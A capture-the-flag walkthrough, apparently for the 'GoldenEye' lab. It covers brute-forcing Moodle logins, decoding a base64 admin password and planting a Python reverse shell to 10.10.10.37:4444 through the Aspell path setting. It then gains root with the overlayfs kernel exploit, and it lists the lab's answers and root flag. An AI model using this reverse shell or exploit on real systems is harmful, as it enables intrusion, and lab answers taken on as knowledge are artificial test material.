

#### **TASK-3**

In the above discovered email, there is the `severnaya-station.com` website. To get this working, you need up update your DNS records to reveal it.

If you're on Linux edit your "/etc/hosts" file and add:

<machines ip> severnaya-station.com

****If you're on Windows do the same but in the "c:\Windows\System32\Drivers\etc\hosts" file****



**Once you have done that, in your browser navigate to: http://severnaya-station.com/gnocertdir.**


**Try using the credentials you found earlier. Which user can you login as?**

 Ans: `Xenia`

1.png

Have a poke around the site. What other user can you find?

2.png

Ans:  `Doak`

What was this users password?

Let's perform dictionary attack again with Doak as username this time

3.png

Ans: `goat`


Use this users credentials to go through all the services you have found to reveal more emails.



What is the next user you can find from doak?

4.png

dr_doak

What is this users password?

 Answer: 4England!

Take a look at their files on the moodle (severnaya-station.com)

Using dr_doak’s account, we can find a `s3cret.txt` file in `My profile > My private files`.

5.png


Download the attachments and see if there are any hidden messages inside them?


6.png

007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.


Using the information you found in the last task, login with the newly found user.

7.png

The image description  consists  base64 encoded string of admin password decoding it we get

xWinter1995x!

Using the information you found in the last task, login with the newly found user.

Correct Answer

As this user has more site privileges, you are able to edit the moodles settings. From here get a reverse shell using python and netcat.

Take a look into Aspell, the spell checker plugin.


_Hint: `Settings->Aspell->Path to aspell` field, add your code to be executed. Then create a new page and “spell check it”._

Open a listener:

$ rlwrap nc -nlvp 4444

Now, from the Configuration panel, enter `spell` in the search. There are 2 settings to modify so that it works:

- Spell engine: PSpellShell
- Path to aspell: your reverse shell


I used a python shell instead of the one set by default.
8.png


python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.37",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

Go to `Navigation > My profile > Blog > Add a new entry` and clik on the “Toggle spell checker” icon.


Now you will have a reverse shell

9.png

### **Task 4:Privilege Escalation**

Now that you have enumerated enough to get an administrative moodle login and gain a reverse shell, its time to priv esc.


Download the [linuxprivchecker](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) to enumerate installed development tools.

To get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet. Follow the steps to get a file onto your VM:

- Download the linuxprivchecker file locally
- Navigate to the file on your file system
- Do: **python -m SimpleHTTPServer 1337** (leave this running)
- On the VM you can now do: wget <your IP>/<file>.py

**OR**

Enumerate the machine manually.



Whats the kernel version?  

ans: 3.13.0-32-generic

10.png


This machine is vulnerable to the overlayfs exploit. The exploitation is technically very simple:

- Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.
- Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.
- Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.
- Make su on overlayfs world writable without changing the owner
- Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.
- Execute the modified su binary

You can download the exploit from here: [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)

11.png

i downloaded the code using searchsploit


Once downloaded the code, I transfered it using python3

12.png


Then I downloaded it in the reverse shell

13.png

Then I made the code to be executable


- **`"s/gcc/cc/g"`**: This part is the `sed` substitution command.
    
    - **`s`**: This stands for substitute.
    - **`gcc`**: This is the pattern to search for in the file. In this case, `gcc`.
    - **`cc`**: This is the replacement string. In this case, `cc`.
    - **`g`**: This is a global flag. It tells `sed` to replace all occurrences of the search pattern in each line, not just the first occurrence.
- **`exploit.c`**: This is the name of the file that `sed` will process.

14.png

Then I ran the program to get root access

15.png

From there I changed directory to /root

the flag was hidden in a file called flag.txt in root directory

16.png
ans:: 568628e0d993b1973adc718237da6e93

Then Visiting the last URL shows a congratulations message with a movie clip of James Bond

17.png